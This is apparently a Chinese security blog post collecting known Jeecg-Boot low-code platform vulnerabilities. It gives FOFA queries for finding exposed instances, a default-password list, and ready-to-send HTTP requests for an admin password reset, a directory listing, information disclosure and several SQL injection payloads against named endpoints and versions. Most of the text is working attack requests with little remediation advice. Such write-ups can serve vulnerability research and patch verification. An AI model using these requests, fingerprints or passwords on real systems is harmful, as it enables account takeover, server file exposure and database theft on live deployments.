#  Jeecg-boot常见漏洞汇总（一）  
dmd5安全
                    dmd5安全  dmd5安全   2026-01-20 02:24  
  
jeecg-boot介绍  
  
JeecgBoot是一款集成AI应用的，基于BPM流程的低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成->OnlineCoding-> 代码生成-> 手工MERGE， 帮助Java项目解决80%的重复工作，让开发更多关注业务，提高效率、节省成本，同时又不失灵活性！低代码能力：Online表单、表单设计、流程设计、Online报表、大屏/仪表盘设计、报表设计; AI应用平台功能：AI知识库问答、AI模型管理、AI流程编排、AI聊天等，支持含ChatGPT、DeepSeek、Ollama等多种AI大模型。  
  
  
官网地址：https://jeecg.com  
  
开源项目地址：https://github.com/zhangdaiscott/jeecg-boot  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njnobY7k6DrDZZrBthib7PfIFOibQju2ic5l7O6icFs5nSwfEdV8JV9Y5pib1Q/640?wx_fmt=png&from=appmsg "")  
  
  
资产测绘  
  
fofa:  
  
body="/sys/common/pdf/pdfPreviewIframe"  
  
title="Jeecg-Boot 快速开发平台" || body="积木报表"  
  
body="jeecg-boot"  
  
app="JEECG"  
  
icon_hash="1380908726"  
  
icon_hash="-250963920"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njng69hwWNPzSs6hYibAiaVyR5w8ulJQ27hMmfWXiatv9FkHrgOwb2zibHZYw/640?wx_fmt=png&from=appmsg "")  
  
  
常见情况  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njn84zuEU1Bt2IpyrB4vdqLFRpmfFLQQuzmYmGa8SppaZDHLgZfgtgjUw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njngBdQLprWMCenBgW93rb9SZTwiajUpauz9OibMn9LPv2JGGvXxNbmVibNg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njnZq3scUcTJ44diaoKLgRrloHMBPhNQicSos4ybxppeJeguK6hX39QESrg/640?wx_fmt=png&from=appmsg "")  
  
出现以下这几种情况基本可以确定是jeecg-boot,也可以通过接口或者图标等信息进行判定。  
  
  
常见弱口令漏洞  
```
admin/123456
jeecg/123456
admn/admin
test/test
demo/test
jeecg/jeecg123456
guest/guest
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njnTG6u4KzQwFACEaqbOFPZa7E0hO2WVAhib2picZniaQLVOFeh0JwkleHkQ/640?wx_fmt=png&from=appmsg "")  
  
  
JeecgBoot passwordChange接口任意用户密码重置  
```
GET /jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
  
jeecg-boot-checkOnlyUser信息泄露漏洞  
```
/jeecg-boot/sys/user/querySysUser?username=admin

Jeecg-Boot 2.4.5及之前版本存在不安全权限漏洞。攻击者可利用该漏洞通过uri:/sys/user/checkOnlyUser?username=admin提升权限并查看敏感信息。
```  
  
  
jeecg-boot-目录遍历漏洞  
```
/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/

低权限账号访问直接返回服务器文件目录信息
```  
  
  
Jeecg-boot 3.4.4 /sys/dict/queryTableData SQL注入  
```
在Jeecg-boot 3.4.4中曾发现分类为致命的漏洞。 此漏洞会影响未知代码文件/sys/dict/queryTableData。 手动调试的不合法输入可导致 SQL注入。

POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13
Content-Type: application/json; charset=utf-8
Content-Length: 127
Host: 
Connection: close
Accept-Encoding: gzip, deflate
{"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}
```  
  
  
JeecgBoot onlDragDatasetHead/getTotalData SQL注入  
```
JeecgBoot v3.7.1 通过组件 /onlDragDatasetHead/getTotalData 存在 SQL 注入漏洞。

POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/2
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Content-Type: application/json
Content-Length: 281
{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(0x7e,version(),0x7e)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
```  
  
  
jeecg-boot-getDictItemsByTable SQL注入漏洞  
```
JeecgBoot是一款基于代码生成器的低代码开发平台，它专为简化Java项目开发流程、提高开发效率而设计。攻击者通过注入恶意的SQL代码，能够窃取、篡改或删除数据库中的数据，甚至执行系统命令，对网站和服务器造成严重影响。

GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Sec-Purpose: prefetch
Connection: close
Priority: u=6
```  
  
  
Jeecg-Boot /jmreport/show SQL注入漏洞  
```
jeecg-boot 3.5.0和3.5.1 版本存在安全漏洞，该漏洞源于 /jeecg-boot/jmreport/show 接口的 id 参数存在SQL注入漏洞。

POST /jeecg-boot/jmreport/show HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Connection: close
Content-Length: 182
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip
{
"id": "961455b47c0b86dc961e90b5893bff05",
"apiUrl": "",
"params": {
"id ": "1 ' or ' % 1 % ' like (updatexml(0x3a,concat(1,(version())),1)) or ' % % ' like '"
}
}
```  
  
  
jeecg-boot sys/duplicate/check SQL注入  
```
/sys/duplicate/check 接口SQL注入，checksql可以被绕过，该漏洞需要进行身份认证。

GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(0))&fieldVal=1&dataId=asd HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Connection: close
Cache-Control: max-age=0
X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU

GET /jeecg-boot/sys/duplicate/check?tableName=sys_log&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(10))&fieldVal=1000&dataId=2000 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Connection: close
Cache-Control: max-age=0
X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU
```  
  
